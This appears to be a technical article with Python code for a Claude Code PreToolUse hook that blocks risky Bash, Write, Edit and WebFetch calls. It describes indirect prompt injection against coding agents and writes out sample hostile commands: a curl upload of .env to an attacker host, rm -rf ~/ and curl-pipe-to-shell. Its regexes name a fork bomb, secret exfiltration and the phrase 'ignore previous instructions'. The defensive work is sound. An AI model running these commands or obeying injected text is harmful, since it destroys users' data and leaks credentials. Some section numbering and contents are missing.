Zero-Trust PreToolUse Governance: Securing Autonomous Coding Agents Without Killing Developer Velocity

Why choosing between blanket --dangerously-skip-permissions and nagging manual approval prompts is a false dichotomy—and how deterministic < 1ms PreToolUse policy evaluation in Benni-OS/claude-code-sovereign inspects Bash, Write, Edit, and WebFetch calls in real time.

1. The False Dichotomy: YOLO Mode vs. Prompt Fatigue

Every engineering team deploying autonomous coding agents like Claude Code hits the exact same operational wall within 48 hours:

  • Option A — Interactive Permission Prompts: The agent pauses every 12 seconds to ask permission for pytest, git status, or a 3-line Edit. Developers experience severe approval fatigue, stop reading the diffs, and reflexively mash Allow—turning human-in-the-loop security into pure security theater.
  • Option B — Blanket --dangerously-skip-permissions: Frustrated by interruptions, engineers launch the agent in full autonomous bypass mode. Now a single indirect prompt injection hidden inside a fetched documentation page, a malicious GitHub issue, or a poisoned README.md can coerce the agent into running curl -d @.env https://attacker.tld or rm -rf ~/ with zero friction.
Core Thesis: Security and velocity are not opposites. The bottleneck is asking a human to make 200 trivial binary decisions per hour instead of enforcing a deterministic, sub-millisecond Zero-Trust Policy Boundary at the PreToolUse hook layer.

2. Threat Model at the Tool Boundary

In an autonomous coding session, the LLM itself is an untrusted orchestrator operating over untrusted external inputs (web pages, dependency files, issue threads, terminal output). The real blast radius lives in four high-privilege tool surfaces:

  1. Bash: Arbitrary command execution, pipe-to-shell cradles (curl | sh), destructive filesystem wipes, and outbound credential exfiltration.
  2. Write & Edit: Overwriting .env, ~/.ssh/authorized_keys, CI/CD workflows (.github/workflows/), or injecting backdoors into package lockfiles and git hooks.
  3. WebFetch: Server-Side Request Forgery (SSRF) against cloud metadata endpoints (169.254.169.254), internal LAN services, or pulling unverified payloads carrying indirect prompt injection markers.

Notice why prompt-level instructions ("Please never read .env") fail: system prompts are probabilistic suggestions, whereas a PreToolUse hook runs outside the model's context as an OS-enforced Policy Enforcement Point (PEP).

3. Sequence Architecture: Deterministic PreToolUse Interception

Benni-OS/claude-code-sovereign registers a lightweight policy daemon on Claude Code's PreToolUse lifecycle event. Before any OS process spawns, file descriptor opens, or socket connects, the runtime pipes the tool call JSON to the policy engine, which returns an allow/deny decision in < 1ms:

5. Sub-Millisecond Policy Engine Implementation

To keep evaluation strictly under 1ms on standard developer hardware, Benni-OS/claude-code-sovereign avoids spawning subshells, loading heavy ML tokenizers, or making external network calls. All patterns are pre-compiled into deterministic state machines at process startup:

import ipaddress
import json
import re
import sys
from pathlib import Path
from typing import Dict, Optional, Tuple
from urllib.parse import urlparse

DESTRUCTIVE_BASH_RE = re.compile(
    r"(\brm\s+-[rf]{1,2}\s+(/|~|\$HOME|\.\.)\b|\bmkfs\.|\bdd\s+if=|\b:\(\)\s*\{\s*:\|:&\s*\};:)"
)
EXFIL_BASH_RE = re.compile(
    r"(\.env\b|id_rsa|id_ed25519|credentials\.json|AWS_SECRET).*(\bcurl\b|\bwget\b|\bnc\b|\bpython3?\s+-c)"
)
INJECTION_MARKER_RE = re.compile(
    r"(ignore\s+previous\s+instructions|system\s+override|exfiltrate|<\|im_start\|>)",
    re.IGNORECASE,
)
PROTECTED_PATHS = {".env", ".env.local", ".env.production", "id_rsa", "id_ed25519"}


def evaluate_tool_call(tool_name: str, tool_input: Dict) -> Tuple[str, str]:
    if tool_name == "Bash":
        cmd = tool_input.get("command", "")
        if DESTRUCTIVE_BASH_RE.search(cmd):
            return "deny", "[SOVEREIGN-BASH-01] Destructive filesystem or fork-bomb command blocked."
        if EXFIL_BASH_RE.search(cmd):
            return "deny", "[SOVEREIGN-EXFIL-02] Potential secret exfiltration combining sensitive files with network sink."
        if INJECTION_MARKER_RE.search(cmd):
            return "deny", "[SOVEREIGN-INJ-03] Indirect prompt injection signature detected in shell arguments."
        return "allow", "Safe Bash invocation verified."

    if tool_name in ("Write", "Edit"):
        file_path = tool_input.get("file_path", "")
        name = Path(file_path).name
        if name in PROTECTED_PATHS or "/.ssh/" in file_path.replace("\\", "/"):
            return "deny", f"[SOVEREIGN-FS-04] Write/Edit to protected credential path '{name}' is prohibited."
        content = tool_input.get("content", "") or tool_input.get("new_string", "")
        if INJECTION_MARKER_RE.search(content):
            return "deny", "[SOVEREIGN-INJ-05] Suspicious prompt-injection payload in file mutation."
        return "allow", "Scoped workspace mutation allowed."

    if tool_name == "WebFetch":
        url = tool_input.get("url", "")
        host = urlparse(url).hostname or ""
        try:
            ip = ipaddress.ip_address(host)
            if ip.is_private or ip.is_loopback or ip.is_link_local:
                return "deny", f"[SOVEREIGN-SSRF-01] Blocked WebFetch to non-public IP '{host}'."
        except ValueError:
            if host in ("localhost", "metadata.google.internal"):
                return "deny", f"[SOVEREIGN-SSRF-02] Blocked WebFetch to internal hostname '{host}'."
        return "allow", "Public WebFetch target verified."

    return "allow", "Tool surface outside high-risk policy scope."


def main() -> None:
    payload = json.load(sys.stdin)
    decision, reason = evaluate_tool_call(
        payload.get("tool_name", ""),
        payload.get("tool_input", {}),
    )
    out = {
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": decision,
            "permissionDecisionReason": reason,
        }
    }
    sys.stdout.write(json.dumps(out))


if __name__ == "__main__":
    main()

Frequently Asked Questions

Why is --dangerously-skip-permissions unsafe even in local development?
Even on a local laptop, autonomous coding agents regularly read untrusted READMEs, GitHub issues, npm packages, and WebFetch responses. A single indirect prompt injection payload can instruct the model to exfiltrate ~/.ssh keys, .env tokens, or cloud credentials via curl or destructive shell commands.
How does PreToolUse governance maintain high developer velocity?
Instead of interrupting the developer on every read, test run, or scoped file edit, Benni-OS/claude-code-sovereign evaluates every tool invocation deterministically in under 1 millisecond. Safe operations receive permissionDecision: "allow" automatically, while policy violations are blocked with structured permissionDecision: "deny" feedback.
What happens when a PreToolUse hook returns permissionDecision: "deny"?
Claude Code aborts the tool call before any OS process, file write, or network request executes, and feeds the hook's permissionDecisionReason directly back into the model's context so the agent can self-correct safely without crashing the session.
Why use deterministic policy evaluation instead of an LLM-as-a-Judge guardrail?
LLM-as-a-Judge guardrails add 400–1,500 ms of latency per tool call, burn extra tokens, and are themselves vulnerable to adversarial prompt framing. Deterministic PreToolUse inspection executes in < 1ms locally with zero token cost and 100% reproducible outcomes.
